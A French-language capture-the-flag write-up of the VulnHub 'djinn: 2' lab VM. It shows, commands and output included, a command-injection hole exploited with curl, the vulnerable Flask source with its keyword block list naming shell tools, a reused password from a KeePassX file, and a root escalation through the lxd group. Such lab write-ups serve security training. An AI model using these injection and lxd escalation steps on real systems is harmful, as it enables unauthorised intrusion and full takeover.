# Solution du CTF Djinn: 2 de VulnHub

Voici le writeup pour le CTF [djinn: 2](https://www.vulnhub.com/entry/djinn-2,420/), sans doute le moins fun des trois avec quelques services qui n'ont pas d'utilité.

```
Nmap scan report for 192.168.242.134
Host is up (0.00046s latency).
Not shown: 65530 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 0        0              14 Jan 12  2020 creds.txt
| -rw-r--r--    1 0        0             280 Jan 19  2020 game.txt
|_-rw-r--r--    1 0        0             275 Jan 19  2020 message.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.242.1
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 223c7f28794401ca55d2486d065dcdac (RSA)
|   256 71e482a49530a047d514fe3bc0106cd8 (ECDSA)
|_  256 ce774833be27984b5e4d622fa33343a7 (ED25519)
1337/tcp open  waste?
| fingerprint-strings: 
|   GenericLines: 
|     ____ _____ _ 
|     ___| __ _ _ __ ___ ___ |_ _(_)_ __ ___ ___ 
|     \x20/ _ \x20 | | | | '_ ` _ \x20/ _ \n| |_| | (_| | | | | | | __/ | | | | | | | | | __/
|     ____|__,_|_| |_| |_|___| |_| |_|_| |_| |_|___|
|     @0xmzfr, Thanks for hiring me.
|     Since I know how much you like to play game. I'm adding another game in this.
|     Math game
|     Catch em all
|     Exit
|     Stop acting like a hacker for a damn minute!!
|   NULL: 
|     ____ _____ _ 
|     ___| __ _ _ __ ___ ___ |_ _(_)_ __ ___ ___ 
|     \x20/ _ \x20 | | | | '_ ` _ \x20/ _ \n| |_| | (_| | | | | | | __/ | | | | | | | | | __/
|     ____|__,_|_| |_| |_|___| |_| |_|_| |_| |_|___|
|     @0xmzfr, Thanks for hiring me.
|     Since I know how much you like to play game. I'm adding another game in this.
|     Math game
|     Catch em all
|_    Exit
5000/tcp open  http    Werkzeug httpd 0.16.0 (Python 3.6.9)
|_http-title: 405 Method Not Allowed
|_http-server-header: Werkzeug/0.16.0 Python/3.6.9
7331/tcp open  http    Werkzeug httpd 0.16.0 (Python 3.6.9)
|_http-title: Lost in space
|_http-server-header: Werkzeug/0.16.0 Python/3.6.9
```

## Le petit tour

J'ai joué un peu avec ce port 1337 qui propose deux options. La première est encore des questions mathématiques mais ne semble aboutir nul part :

```shellsession
$ ncat 192.168.242.134 1337 -v
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Connected to 192.168.242.134:1337.
  ____                        _____ _                
 / ___| __ _ _ __ ___   ___  |_   _(_)_ __ ___   ___ 
| |  _ / _` | '_ ` _ \ / _ \   | | | | '_ ` _ \ / _ \
| |_| | (_| | | | | | |  __/   | | | | | | | | |  __/
 \____|\__,_|_| |_| |_|\___|   |_| |_|_| |_| |_|\___|


Hey @0xmzfr, Thanks for hiring me.
Since I know how much you like to play game. I'm adding another game in this.
1. Math game
2. Catch em all
3. Exit
> 1
I see you wanna do some Mathematics. I think you know the rule
Let's start then
3 * 7
> 21
6 / 5
> 1
Look up at the stars and not down at your feet. Try to make sense of what you see, and wonder about what makes the universe exist. Be curious.

-- Stephen (not morris)
```

La seconde option indique après quelques secondes un message d'erreur à propos d'une conexion :

```shellsession
> 2
        Connecting to the game server
        Unable to connect to the game server!!
```

J'ai mis en écoute le trafic réseau mais je n'ai remarqué aucune connexion.

Pour terminer le serveur ne semble pas vulnérable à l'exécution de code Python qu'il y avait sur l'autre CTF de la série :

```python
> __import__("os").system("id")
Stop acting like a hacker for a damn minute!!
```

J'en viens alors aux différents messages laissés sur le FTP :

> @nitish81299, you and sam messed it all up. I've fired sam for all the fuzz he created and    
> this will be your last warning if you won't put your shit together than you'll be gone as well.  
> I've hired @Ugtan_ as our new security head, hope  he'll do something good.  
> 
> - @0xmzfr

> @0xmzfr I would like to thank you for hiring me. I won't disappoint you like SAM.  
> Also I've started implementing the secure way of authorizing the access to our    
> network. I have provided @nitish81299 with the beta version of the key fob  
> hopes everything would be good.  
> 
> - @Ugtan_

> nitu:7846A$56

Aucune idée d'où utiliser les identifiants pour le moment. Ils ne fonctionnent pas sur FTP et SSH.

J'énumore alors le port 7331 et il trouve deux entrées :

```
200       97l      143w     1280c http://192.168.242.134:7331/source
200       23l       53w      456c http://192.168.242.134:7331/wish
```

On retrouve le `/wish` (lorraine) qui était présent sur [Djinn: 1](https://github.com/devl00p/blog/blob/main/ctf_writeups/Solution%20du%20CTF%20Djinn%3A%201%20de%20VulnHub.md) sauf que là, la RCE est patchée, d'ailleurs un message indique que les vulnérabilités ont été corrigées. J'ai testé quelques injections qui n'ont mené nul part.

L'URL `/source` retourne le code suivant :

```python
import re
from time import sleep

import requests

URL = "http://{}:5000/?username={}&password={}"

def check_ip(ip: str):
    """
    Check whether the input IP is valid or not
    """
    if re.match(r'^(?:(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9][0-9]|[0-9])'
                '(\.(?!$)|$)){4}$', ip):
        return True
    else:
        return False


def catcher(host, username, password):
    try:
        url = URL.format(host, username, password)
        requests.post(url)
        sleep(3)
    except Exception:
        pass

    print("Unable to connect to the server!!")


def main():
    print("If you have this then congratulations on being a part of an awesome organization")
    print("This key will help you in connecting to our system securely.")
    print("If you find any issue please report it to ugtan@djinn.io")

    ip = input('\nIP of the machine: ')
    username = input('Your username: ')
    password = input('Your password: ')

    if ip and check_ip(ip) and username == "REDACTED" and password == "REDACTED":
        print("Verifiying %s with host %s " % (username, ip))
        catcher(ip, username, password)
    else:
        print("Invalid IP address given")


if __name__ == "__main__":
    main()
```

On remarque la mention du port 5000 qui correspond sans doute au service qui tourne sur le CTF. Ce service indique que la méthode GET n'est pas acceptée :

```shellsession
$ curl -I http://192.168.242.134:5000/
HTTP/1.0 405 METHOD NOT ALLOWED
```

Du coup on questionne avec `OPTIONS` :

```shellsession
$ curl -D- -XOPTIONS http://192.168.242.134:5000/
HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Allow: OPTIONS, POST
```

Donc la méthode `POST` est autorisée mais on a un message d'accès refusé :

```shellsession
$ curl -D- -XPOST http://192.168.242.134:5000/
HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 15

Access Denied!!
```

A partir du moment où `username` apparait dans la query string le serveur nous autorise :

```shellsession
$ curl -D- -XPOST 'http://192.168.242.134:5000/?username'
HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 0
```

Si on remplit `username` et `password` avec les identifiants dont on dispose on ne reçoit rien de plus.

## KeeKeespass?

Les paramètres sont peut être vulnérables mais il faut pouvoir les attaquer avec la requête POST. Heureusement les récentes modification sur Wapiti rajoutent un paramètre pour spécifier des données à envoyer via POST sur une URL de base de scan. En gros ça donne :

```bash
wapiti -u 'http://192.168.242.134:5000/?username=lol&password=wtf' -v2 --color --scope page --data "a=1"
```

Wapiti y trouve une faille d'exécution de commande :

```
---
Command execution in http://192.168.242.134:5000/ via injection in the parameter username
Evil request:
    POST /?username=set&password=a HTTP/1.1
    host: 192.168.242.134:5000
    connection: keep-alive
    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
    accept-language: en-US
    accept-encoding: gzip, deflate, br
    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    content-type: application/x-www-form-urlencoded
    content-length: 3
    Content-Type: application/x-www-form-urlencoded

    a=1
---
```

J'ai intégré l'utilisation de la commande `set` comme payload il y a un bon moment mais il me semble que cette commande a l'avantage de donner un output à la fois sous Linux et Windows. Sous Linux elle retourne tout ce qui est intégré dans l'environement bash en cours (variables d'environment, fonctions, etc)

On est vite bloqué sur cette RCE qui semble bloquer quelques caractères comme le point virgule :

```shellsession
$ curl -XPOST 'http://192.168.242.134:5000/?username=ls;id&password='
Access Denied!!
```

Mais on peut en savoir plus sur les restrictions en récupérant le code source :

```python
$ curl -XPOST 'http://192.168.242.134:5000/?username=cat+app.py&password='
import subprocess
from flask import Flask, request


app = Flask(__name__)
app.secret_key = "key"


RCE = ["|", "*", "^", "$", ";", "nc", "bash", "bin", "eval",  "python"]


def validate(cmd):
    try:
        for i in RCE:
            if i in cmd:
                return False
        return True
    except Exception:
        return False


@app.route("/", methods=["POST"])
def index():
    command = request.args.get("username")
    if validate(command):
        output = subprocess.Popen(command, shell=True,
                                  stdout=subprocess.PIPE).stdout.read()
    else:
        output = "Access Denied!!"
    return output


if __name__ == "__main__":
    app.run(host='0.0.0.0', debug=False)
```

On ne peut pas chainer les commandes mais on peut les passer les uns après les autres.

Les deux process Flask tournent en `www-data` du coup inutile de s'y attader.

On trouve sur le système un utilisateur Nitish qui a une base de données KeePassX dans `/var/backups` :

```shellsession
www-data@djinn:/opt$ find / -user nitish -ls 2> /dev/null 
   525042      4 -rwxr-xr-x   1 nitish   nitish       2174 Dec 20  2019 /var/backups/nitu.kdbx
   540827      4 drwxr-x---   4 nitish   nitish       4096 Jan 21  2020 /home/nitish
```

Cette fois otre identifiant sert à ouvrir le fichier kdbx avec KeepPassX et ainsi obtenir un mot de passe qui y était stocké :

![Djinn 2 VulnHub Nitish KeePassX](https://raw.githubusercontent.com/devl00p/blog/master/images/vulnhub/djinn_nitish_keepassx.jpg)

L'utilisation de ce mdp permet d'obtenir un shell :

```shellsession
nitish@djinn:~$ id
uid=1000(nitish) gid=1000(nitish) groups=1000(nitish),4(adm),24(cdrom),30(dip),46(plugdev),108(lxd),113(lpadmin),114(sambashare)
```

## lxc2root

L'utilisateur faisant partie du groupe `lxd` on va procédé à une escalade de privilège similaire à ce qu'il se fait avec Docker. Tout est documenté chez [HackTricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation).

Dans un premier temps sur ma machine je génère une image LXD de Alpine :

```shellsession
$ git clone https://github.com/saghul/lxd-alpine-builder
Clonage dans 'lxd-alpine-builder'...
remote: Enumerating objects: 50, done.
remote: Counting objects: 100% (8/8), done.
remote: Compressing objects: 100% (6/6), done.
remote: Total 50 (delta 2), reused 5 (delta 2), pack-reused 42
Réception d'objets: 100% (50/50), 3.11 Mio | 1.02 Mio/s, fait.
Résolution des deltas: 100% (15/15), fait.
$ cd lxd-alpine-builder
$ sed -i 's,yaml_path="latest-stable/releases/$apk_arch/latest-releases.yaml",yaml_path="v3.8/releases/$apk_arch/latest-releases.yaml",' build-alpine
$ ./build-alpine -h
build-alpine: must be run as root
$ sudo ./build-alpine
[sudo] Mot de passe de root : 
which: no apk in (/usr/sbin:/usr/bin:/sbin:/bin:/usr/sbin:/usr/bin:/sbin:/bin)
Determining the latest release... v3.8
Using static apk from http://dl-cdn.alpinelinux.org/alpine//v3.8/main/x86_64
Downloading alpine-keys-2.1-r1.apk
tar: Le mot clé inconnu « APK-TOOLS.checksum.SHA1 » pour l'en-tête étendu a été ignoré
--- snip ---
Downloading alpine-mirrors-3.5.9-r0.apk
Downloading apk-tools-static-2.10.6-r0.apk
alpine-devel@lists.alpinelinux.org-4a6a0840.rsa.pub: Réussi
Verified OK
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  2600  100  2600    0     0   4006      0 --:--:-- --:--:-- --:--:--  4012
--2022-11-25 14:39:32--  http://alpine.mirror.wearetriple.com/MIRRORS.txt
Résolution de alpine.mirror.wearetriple.com (alpine.mirror.wearetriple.com)… 2a00:1f00:dc06:10::106, 93.187.10.106
Connexion à alpine.mirror.wearetriple.com (alpine.mirror.wearetriple.com)|2a00:1f00:dc06:10::106|:80… connecté.
requête HTTP transmise, en attente de la réponse… 200 OK
Taille : 2600 (2,5K) [text/plain]
Sauvegarde en : « /tmp/lxd-alpine-builder/rootfs/usr/share/alpine-mirrors/MIRRORS.txt »

/tmp/lxd-alpine-builder/rootfs/usr/share/alpine-mirr 100%[===============================================>]   2,54K  --.-KB/s    ds 0s      

2022-11-25 14:39:32 (236 MB/s) — « /tmp/lxd-alpine-builder/rootfs/usr/share/alpine-mirrors/MIRRORS.txt » sauvegardé [2600/2600]

Selecting mirror http://alpinelinux.mirror.garr.it//v3.8/main
fetch http://alpinelinux.mirror.garr.it//v3.8/main/x86_64/APKINDEX.tar.gz
(1/18) Installing musl (1.1.19-r11)
(2/18) Installing busybox (1.28.4-r3)
Executing busybox-1.28.4-r3.post-install
(3/18) Installing alpine-baselayout (3.1.0-r0)
Executing alpine-baselayout-3.1.0-r0.pre-install
Executing alpine-baselayout-3.1.0-r0.post-install
(4/18) Installing openrc (0.35.5-r5)
Executing openrc-0.35.5-r5.post-install
(5/18) Installing alpine-conf (3.8.0-r0)
(6/18) Installing libressl2.7-libcrypto (2.7.5-r0)
(7/18) Installing libressl2.7-libssl (2.7.5-r0)
(8/18) Installing libressl2.7-libtls (2.7.5-r0)
(9/18) Installing ssl_client (1.28.4-r3)
(10/18) Installing zlib (1.2.11-r1)
(11/18) Installing apk-tools (2.10.6-r0)
(12/18) Installing busybox-suid (1.28.4-r3)
(13/18) Installing busybox-initscripts (3.1-r4)
Executing busybox-initscripts-3.1-r4.post-install
(14/18) Installing scanelf (1.2.3-r0)
(15/18) Installing musl-utils (1.1.19-r11)
(16/18) Installing libc-utils (0.7.1-r0)
(17/18) Installing alpine-keys (2.1-r1)
(18/18) Installing alpine-base (3.8.5-r0)
Executing busybox-1.28.4-r3.trigger
OK: 7 MiB in 18 packages
$ ls alpine-v3.*
alpine-v3.13-x86_64-20210218_0139.tar.gz  alpine-v3.8-x86_64-20221125_1439.tar.gz
```

Puis une fois les fichiers uploadés sur la VM j'importe l'image, je la monte avec le système de fichier hôte et je la lance avec un shell :

```shellsession
nitish@djinn:~$ lxc image import ./alpine*.tar.gz --alias myimage
Image imported with fingerprint: 7b13e5f8c76ca3ec153528e73dbb748daf7deef0dc8b3bb683681f98b66c1b49
nitish@djinn:~$ lxc image list
+---------+--------------+--------+-------------------------------+--------+--------+------------------------------+
|  ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          |  ARCH  |  SIZE  |         UPLOAD DATE          |
+---------+--------------+--------+-------------------------------+--------+--------+------------------------------+
| myimage | 7b13e5f8c76c | no     | alpine v3.13 (20210218_01:39) | x86_64 | 5.63MB | Nov 25, 2022 at 2:44pm (UTC) |
+---------+--------------+--------+-------------------------------+--------+--------+------------------------------+
nitish@djinn:~$ lxd init
Would you like to use LXD clustering? (yes/no) [default=no]: 
Do you want to configure a new storage pool? (yes/no) [default=yes]: 
Name of the new storage pool [default=default]: 
Name of the storage backend to use (btrfs, dir, lvm) [default=btrfs]: 
Create a new BTRFS pool? (yes/no) [default=yes]: 
Would you like to use an existing block device? (yes/no) [default=no]: 
Size in GB of the new loop device (1GB minimum) [default=15GB]: 
Would you like to connect to a MAAS server? (yes/no) [default=no]: 
Would you like to create a new network bridge? (yes/no) [default=yes]: 
What should the new bridge be called? [default=lxdbr0]: 
What IPv4 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]: 
What IPv6 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]: 
Would you like LXD to be available over the network? (yes/no) [default=no]: 
Would you like stale cached images to be updated automatically? (yes/no) [default=yes] 
Would you like a YAML "lxd init" preseed to be printed? (yes/no) [default=no]: 
nitish@djinn:~$ lxc init myimage mycontainer -c security.privileged=true
Creating mycontainer
nitish@djinn:~$ lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
Device mydevice added to mycontainer
nitish@djinn:~$ lxc start mycontainer
nitish@djinn:~$ lxc exec mycontainer /bin/sh
~ # ls /mnt/root/root
proof.sh  scripts
~ # . /mnt/root/root/proof.sh
/bin/sh: /mnt/root/root/proof.sh: line 9: figlet: not found
djinn-2 pwned...
__________________________________________________________________________

Proof: cHduZWQgZGppbm4tMiBsaWtlIGEgYm9zcwo=
Path: /root
Date: Fri Nov 25 14:48:18 UTC 2022
Whoami: root
__________________________________________________________________________

By @0xmzfr

Thanks to my fellow teammates in @m0tl3ycr3w for betatesting! :-)

If you enjoyed this then consider donating (https://mzfr.github.io/donate/)
so I can continue to make these kind of challenges.
```

*Publié le 25 novembre 2022*


